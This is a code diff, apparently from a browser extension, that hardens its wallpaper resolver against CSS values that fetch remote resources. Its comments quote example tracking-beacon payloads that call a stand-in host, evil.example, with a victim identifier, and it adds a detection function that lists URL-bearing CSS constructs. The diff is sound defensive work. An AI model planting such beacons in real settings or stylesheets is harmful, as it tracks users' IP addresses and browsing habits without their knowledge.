@@ -85,8 +85,39 @@ export function isWallpaperImage(value) {
   return typeof value === 'string' && value.length > 0 && DATA_IMAGE_RE.test(value);
 }
 
-/** Image paths we build a url() from — no quotes, parens or whitespace. */
-const SAFE_PATH_RE = /^[A-Za-z0-9._\-/]+$/;
+/**
+ * Image paths we build a url() from — no quotes, parens or whitespace.
+ *
+ * The `//` exclusion is load-bearing, not tidiness: `//evil.example/b.png`
+ * is composed entirely of letters, dots and slashes, so without it a
+ * protocol-relative URL passes as an innocent local path and becomes
+ * `url("//evil.example/b.png")` — the same off-origin beacon the css
+ * branch refuses, arriving through the image branch instead. No real
+ * asset path contains a doubled slash.
+ */
+const SAFE_PATH_RE = /^(?!.*\/\/)[A-Za-z0-9._\-/]+$/;
+
+/**
+ * Can this CSS value cause the browser to issue a network request?
+ *
+ * Only a URL-bearing function can, so those are refused by name rather
+ * than by trying to allowlist the shape of every legacy gradient (which
+ * would silently reset wallpapers we failed to anticipate). `var()` is
+ * included because a custom property could itself resolve to a `url()`,
+ * and whitespace is stripped first because CSS tolerates `image-set (`.
+ *
+ * Deliberately generous: no gradient, hex colour or named colour a
+ * legacy marker ever held contains any of these substrings.
+ */
+function canFetch(value) {
+  const v = String(value).replace(/\s+/g, '').toLowerCase();
+  return v.includes('url(')
+    || v.includes('image-set(')
+    || v.includes('image(')
+    || v.includes('cross-fade(')
+    || v.includes('var(')
+    || v.includes('//');
+}
 
 /** Unwrap AppStorage's {data, version, ts, …} envelope, or pass through. */
 function unwrapEnvelope(raw) {
@@ -163,9 +194,28 @@ export function resolveWallpaper(marker, customImage = '') {
   if (SAFE_PATH_RE.test(path)) return { kind: 'image', value: path };
 
   // A raw CSS background from a much older build (gradients, hex colors).
-  // Anything with a quote or a paren imbalance never reaches here as an
-  // image; letting it through as CSS is safe because the browser drops an
-  // invalid declaration rather than reinterpreting the rest of the rule.
+  //
+  // NOT an arbitrary passthrough. The old reasoning here — "the browser
+  // drops an invalid declaration rather than reinterpreting the rest of
+  // the rule" — is true, and it only covers declaration INJECTION. It
+  // says nothing about a perfectly *valid* declaration that fetches a
+  // remote resource:
+  //
+  //     #000 url(https://evil.example/beacon.png?u=victim)
+  //
+  // That is valid CSS, so CSSOM keeps it, and it turns an imported
+  // settings file into a permanent tracking beacon: a request on every
+  // new tab, leaking IP, User-Agent and browsing cadence, invisible
+  // (an unreachable URL just paints nothing) and — because this key's
+  // syncPolicy is 'always' — replicated to the user's other devices.
+  // The key's validator is `typeof v === 'string'`, so every string
+  // reaches here. Verified reachable end-to-end before this guard.
+  //
+  // So: refuse anything that can issue a request. Everything a legacy
+  // marker legitimately held (gradients, hex/named colors) is free of
+  // these constructs, and a refusal falls back to the default wallpaper
+  // rather than rewriting the marker — same rule as a missing image.
+  if (canFetch(path)) return { kind: 'none', value: '' };
   return { kind: 'css', value: path };
 }
 
